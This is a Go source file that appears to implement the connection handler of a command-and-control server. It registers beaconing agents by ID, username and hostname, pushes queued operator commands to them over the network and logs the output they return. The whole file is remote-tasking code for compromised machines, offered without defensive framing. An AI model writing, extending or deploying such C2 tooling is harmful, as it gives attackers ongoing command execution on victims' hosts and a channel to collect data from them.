package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/RodKast/go-c2/pkg/agent"
)

func handleConnection(conn net.Conn) {
	defer conn.Close()
	log.Printf("new connection from %s", conn.RemoteAddr())

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	reader := bufio.NewReader(conn)
	message, err := reader.ReadString('\n')
	if err != nil {
		log.Printf("failed to read message: %v", err)
		return
	}

	parts := strings.Split(strings.TrimSpace(message), ":")
	if len(parts) != 3 {
		log.Printf("invalid message format: %s", message)
		return
	}
	agentID := parts[0]
	username := parts[1]
	hostname := parts[2]

	agentMu.Lock()
	a, exists := agents[agentID]
	if !exists {
		a = agent.NewAgent(username, hostname, conn.RemoteAddr().String())
		a.ID = agentID
		agents[agentID] = a
		log.Printf("new agent registered: %s", agentID)
		fmt.Printf("new agent registered: %s@%s (%s)\n", username, hostname, agentID)
	} else {
		a.LastSeen = time.Now()
		log.Printf("returning beacon: %s", agentID)
	}
	agentMu.Unlock()

	for i := range a.Tasks {
		if a.Tasks[i].Status == "pending" {
			log.Printf("executing pending task for agent %s: %s", agentID, a.Tasks[i].Command)
			_, err = conn.Write([]byte(a.Tasks[i].Command + "\n"))
			if err != nil {
				log.Printf("failed to send task to agent: %v", err)
				return
			}
			a.Tasks[i].Status = "sent"

			conn.SetReadDeadline(time.Now().Add(10 * time.Second))
			output, err := reader.ReadString('\n')
			if err != nil {
				log.Printf("failed to read task output: %v", err)
				return
			}
			a.Tasks[i].Output = strings.TrimSpace(output)
			a.Tasks[i].Status = "completed"
			log.Printf("task output: %s", a.Tasks[i].Output)
			return
		}
	}
	ackMesg := strings.ToUpper(strings.TrimSpace(message))
	response := fmt.Sprintf("ACK: %s\n", ackMesg)
	_, err = conn.Write([]byte(response))
	if err != nil {
		log.Printf("failed to write response: %v", err)
		return
	}
}
